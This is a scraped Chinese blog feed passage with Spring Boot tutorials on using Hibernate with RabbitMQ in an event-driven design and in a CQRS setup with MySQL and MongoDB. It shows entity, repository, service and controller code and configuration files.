<span class="hljs-keyword">import</span> javax.persistence.Table;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-5">4. 配置RabbitMQ</h3>
<h4 data-id="heading-6"><code>RabbitMQConfig.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">orderQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">"orderQueue"</span>, <span class="hljs-literal">true</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">5. 创建事件和事件处理器</h3>
<h4 data-id="heading-8"><code>OrderCreatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getOrderId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderId;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderId</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-built_in">this</span>.orderId = orderId;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-9"><code>OrderEventListener.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderEventListener</span><span class="hljs-params">(OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@RabbitListener(queues = "orderQueue")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreatedEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(event.getOrderId());
        order.setProduct(event.getProduct());
        order.setQuantity(event.getQuantity());
        order.setPrice(event.getPrice());
        orderRepository.save(order);
    }
}
</code></pre>
<h3 data-id="heading-10">6. 发布事件</h3>
<h4 data-id="heading-11"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RabbitTemplate rabbitTemplate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(RabbitTemplate rabbitTemplate, OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.rabbitTemplate = rabbitTemplate;
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);

        <span class="hljs-comment">// Publish event</span>
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>();
        event.setOrderId(savedOrder.getId());
        event.setProduct(savedOrder.getProduct());
        event.setQuantity(savedOrder.getQuantity());
        event.setPrice(savedOrder.getPrice());
        rabbitTemplate.convertAndSend(<span class="hljs-string">"orderQueue"</span>, event);

        <span class="hljs-keyword">return</span> savedOrder;
    }
}
</code></pre>
<h3 data-id="heading-12">7. 创建控制器</h3>
<h4 data-id="heading-13"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;Order&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;Order&gt; orders = orderService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> Order order)</span> {
        order.setId(id); <span class="hljs-comment">// Ensure the order ID is set correctly</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h3 data-id="heading-14">8. 运行应用</h3>
<ol>
<li><strong>启动RabbitMQ</strong>：确保你的RabbitMQ服务器运行在<code>localhost:5672</code>。</li>
<li><strong>启动Spring Boot应用</strong>：运行Spring Boot应用程序。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-15">9. 访问API</h3>
<p>通过以下API访问<code>Order</code>数据：</p>
<ul>
<li><code>POST /orders</code>：创建Order。</li>
<li><code>GET /orders/{id}</code>：按ID获取Order。</li>
<li><code>GET /orders</code>：获取所有Orders。</li>
<li><code>PUT /orders/{id}</code>：更新Order。</li>
<li><code>DELETE /orders/{id}</code>：删除Order。</li>
</ul>
<h3 data-id="heading-16">总结</h3>
<p>通过上述步骤，我们展示了如何在事件驱动架构中使用Hibernate，包括配置Hibernate和数据源、定义实体和DAO层、配置RabbitMQ、创建事件和事件处理器、发布和处理事件，以及使用控制器访问API。在事件驱动架构中，事件触发器和事件处理器之间的松散耦合可以提高系统的可扩展性和灵活性，同时通过使用Hibernate确保数据持久性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（74）如何在CQRS架构中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7600787795477872686</link>    <guid>https://juejin.cn/post/7600787795477872686</guid>    <pubDate>2026-01-30T11:50:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795477872686" data-draft-id="7600990891206983707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（74）如何在CQRS架构中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T11:50:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（74）如何在CQRS架构中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:50:55.000Z" title="Fri Jan 30 2026 11:50:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在CQRS（Command Query Responsibility Segregation）架构中，读操作（Query）和写操作（Command）被分离到不同的模型中。这样可以优化读取和写入的性能，并且允许使用不同的存储技术来实现读取和写入模型。Hibernate通常用于处理写操作，因为它擅长处理复杂的交易和关系数据。</p>
<p>下面我们将展示如何在Spring Boot项目中结合Hibernate实现CQRS架构。</p>
<h3 data-id="heading-0">1. 项目依赖</h3>
<p>在<code>pom.xml</code>中添加必要的依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data MongoDB (for Query Model) --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. 配置数据源和Hibernate属性</h3>
<p>在<code>application.properties</code>中配置MySQL和MongoDB数据源：</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration (Command Model)
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# MongoDB Configuration (Query Model)
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=myquerydatabase
</code></pre>
<h3 data-id="heading-2">3. 定义写模型（Command Model）</h3>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.Table;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-4"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-5">4. 定义读模型（Query Model）</h3>
<h4 data-id="heading-6"><code>OrderView.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;
<span class="hljs-keyword">import</span> org.springframework.data.annotation.Id;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Document(collection = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderView</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-7"><code>OrderViewRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderViewRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MongoRepository</span>&lt;OrderView, String&gt; {
}
</code></pre>
<h3 data-id="heading-8">5. 创建服务层</h3>
<h4 data-id="heading-9">写操作服务（Command Service）</h4>
<h5 data-id="heading-10"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
    }
}
</code></pre>
